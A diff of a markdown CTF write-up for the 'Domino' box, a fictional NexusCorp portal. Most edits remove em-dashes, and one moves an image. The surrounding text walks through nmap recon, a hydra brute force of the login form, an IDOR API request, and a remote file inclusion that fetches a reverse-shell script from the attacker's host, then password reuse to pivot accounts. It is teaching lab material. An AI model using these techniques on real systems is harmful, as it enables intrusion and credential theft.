@@ -8,7 +8,7 @@
 
 ### Overview
 
-Domino is a web-focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own — each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**
+Domino is a web-focused CTF box built around a fictional company portal, "NexusCorp." What makes it a good learning box is that no single vulnerability is fatal on its own  each small weakness hands you exactly the piece of information you need to attack the next layer. This writeup walks through the full chain step by step: **what I ran, why I ran it, how the command actually works, what it gave me back, and what that result told me to try next.**
 
 Four flags are captured along the way. Their real values aren't shown — they're written as `THM{flag1}`, `THM{flag2}`, `THM{flag3}`, `THM{flag4}` as placeholders for wherever your own captured string goes.
 
@@ -42,7 +42,6 @@ Four flags are captured along the way. Their real values aren't shown — they'r
 nmap -sC -sV <target_ip>
 ```
 
-![Nmap:](../../.gitbook/assets/0nmap.jpg)
 
 **How it works:**
 
@@ -58,6 +57,7 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
 |_http-title: NexusCorp Portal
 ```
+![Nmap:](../../.gitbook/assets/0nmap.jpg)
 
 **What this tells me / what's next:** Only two ports are open. SSH (22) is almost never the _entry point_ on a box like this, it's usually where you land _after_ getting credentials some other way. So the entire initial attack surface is the web app on port 80. That's where I go next.
 
@@ -106,13 +106,13 @@ Decryption key reference: see static/app.js (deployment notes)
 
 Separately, the login page itself linked to two pages worth reading before touching anything else: `team.php` and `forgot.php`. The **team page listed staff members and their email addresses**, which directly reveals the app's username format (`firstname.lastname`, matching the pattern the login form's placeholder text hinted at). I noted down the derived usernames  including `sarah.johnson`, `laura.hayes`, and others — since a login page is useless to attack without a list of valid accounts to try.
 
-**Why this matters:** an encrypted backup and a valid username list are two very different but equally useful things. One tells me there's a secret to find; the other tells me _who_ to try to become. Both come from pages nobody explicitly hid — the app leaked its own attack surface just by existing. ![Screenshot:](<../../.gitbook/assets/5users (1).jpg>)
+**Why this matters:** an encrypted backup and a valid username list are two very different but equally useful things. One tells me there's a secret to find; the other tells me _who_ to try to become. Both come from pages nobody explicitly hid  the app leaked its own attack surface just by existing. ![Screenshot:](<../../.gitbook/assets/5users (1).jpg>)
 
 ***
 
 ### 3. Reading the Leaked JavaScript
 
-**Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there — including any comments left by a developer — is effectively public.
+**Why I did this:** the README explicitly said the decryption key lives in `static/app.js`. Frontend JavaScript is sent in full to every visitor's browser, so anything in there  including any comments left by a developer — is effectively public.
 
 **Command:**
 
@@ -136,7 +136,7 @@ _backupKey: 'N3xusK3y2024!!'
 
 ### 4. Decrypting the Backup Config
 
-**Why I did this:** I now have both pieces needed — the encrypted file from `/backup/config.enc`, and the key from `app.js`.
+**Why I did this:** I now have both pieces needed the encrypted file from `/backup/config.enc`, and the key from `app.js`.
 
 **Command:**
 
@@ -179,14 +179,14 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-
 **How it works:**
 
 * `-L users.txt` gives Hydra the list of usernames harvested from `team.php` (one per line).
-* `-P <wordlist>` gives Hydra a password list to try against every username — here, a common-passwords list from SecLists.
+* `-P <wordlist>` gives Hydra a password list to try against every username  here, a common-passwords list from SecLists.
 * `http-post-form` tells Hydra the target is a web login form submitted via POST, not a network service like SSH or FTP.
-* The form string `"/index.php:username=^USER^&password=^PASS^:F=incorrect"` tells Hydra three things: which page to POST to, how to build the POST body (substituting `^USER^`/`^PASS^` with each attempt), and how to recognize a **failed** login — the string `incorrect`, matching this app's `"Invalid credentials"` error message. Anything that _doesn't_ contain that string is treated as a successful login.
+* The form string `"/index.php:username=^USER^&password=^PASS^:F=incorrect"` tells Hydra three things: which page to POST to, how to build the POST body (substituting `^USER^`/`^PASS^` with each attempt), and how to recognize a **failed** login the string `incorrect`, matching this app's `"Invalid credentials"` error message. Anything that _doesn't_ contain that string is treated as a successful login.
 * `-o hydra_results.txt` saves every attempt/result to a file instead of only printing to screen.
 * `-f` tells Hydra to stop as soon as it finds one valid pair, instead of continuing to burn through the rest of the list.
 * `-t 32` runs 32 parallel login attempts at once, to speed things up.
 
-**Result:** Hydra returned a valid username/password pair for `sarah.johnson`. Logging in with those credentials at `/index.php` returned a valid `nexus_session` cookie — my first authenticated foothold on the app, as a normal (non-admin) user.
+**Result:** Hydra returned a valid username/password pair for `sarah.johnson`. Logging in with those credentials at `/index.php` returned a valid `nexus_session` cookie  my first authenticated foothold on the app, as a normal (non-admin) user.
 
 **What this tells me / what's next:** I now had a real, logged-in session as a low-privileged employee account, which is exactly what's needed to legitimately request a JWT from the API (rather than trying to bypass authentication entirely). From here, the API itself becomes the next target.
 
@@ -196,7 +196,7 @@ hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-
 
 ### 6. Flag 1 — Breaking Access Control (IDOR)
 
-**Why I did this:** now logged in as `sarah.johnson`, the dashboard exposed a way to obtain a JWT for the `/api/` routes via `/api/auth/token.php`. Once I had _any_ valid token — even scoped to a low-privileged account — the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the whole basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.
+**Why I did this:** now logged in as `sarah.johnson`, the dashboard exposed a way to obtain a JWT for the `/api/` routes via `/api/auth/token.php`. Once I had _any_ valid token  even scoped to a low-privileged account  the natural next question for any API is: **does the server check that I actually own the resource I'm asking for, or does it just check that my token is valid at all?** That distinction is the whole basis of an IDOR (Insecure Direct Object Reference) vulnerability, so it's always worth testing.
 
 **Command:**
 
@@ -205,7 +205,7 @@ curl 'http://<target_ip>/api/users/profile.php?id=1' \
   -H 'Authorization: Bearer <sarah_johnson_jwt>'
 ```
 
-**How it works:** using the JWT tied to my own low-privilege session, but changing the `id` parameter in the URL to `1` — a guess that user ID 1 is likely the first account created (often an admin, in seeded demo data like this).
+**How it works:** using the JWT tied to my own low-privilege session, but changing the `id` parameter in the URL to `1`  a guess that user ID 1 is likely the first account created (often an admin, in seeded demo data like this).
 
 **Result:**
 
@@ -218,7 +218,7 @@ curl 'http://<target_ip>/api/users/profile.php?id=1' \
   "notes": "THM{flag1}"
 }
 ```
-**What this tells me / what's next:** the server never checked whether the `id` I asked for matched _my own_ account — only that my token was valid at all. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also reveals the admin account's username (`laura.hayes`), useful for impersonating that account later.
+**What this tells me / what's next:** the server never checked whether the `id` I asked for matched _my own_ account  only that my token was valid at all. This confirms an IDOR: any authenticated user can pull any other user's profile by changing one number. It also reveals the admin account's username (`laura.hayes`), useful for impersonating that account later.
 
 **Flag 1:** `THM{flag1}`
 
@@ -292,7 +292,7 @@ print(forged_cookie)
 
 ### 9. Flag 3 — Turning File-Read into Code Execution
 
-**Why I did this:** With admin access confirmed, I wanted to test one more thing on `files.php` — what happens if `name` is a full URL instead of a local path. A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk if the fetched PHP content gets executed rather than just displayed.
+**Why I did this:** With admin access confirmed, I wanted to test one more thing on `files.php`  what happens if `name` is a full URL instead of a local path. A file-read endpoint that also fetches remote URLs is a Remote File Inclusion (RFI) risk if the fetched PHP content gets executed rather than just displayed.
 
 **Setup:**
 
@@ -336,7 +336,7 @@ curl 'http://<ip>/api/files.php?name=http://:8000/reverse.php' \
 
 ### 10. Moving Sideways — www-data to devops
 
-**Why I did this:** `www-data` is a restricted service account. Checking `/etc/passwd` confirmed a real account, `devops` (the same name flagged back in step 4). The database password leaked in step 7 (`D3v0ps!2024`) is worth trying here — password reuse between an app's service credentials and a real system account is extremely common.
+**Why I did this:** `www-data` is a restricted service account. Checking `/etc/passwd` confirmed a real account, `devops` (the same name flagged back in step 4). The database password leaked in step 7 (`D3v0ps!2024`) is worth trying here  password reuse between an app's service credentials and a real system account is extremely common.
 
 **Command:**
 
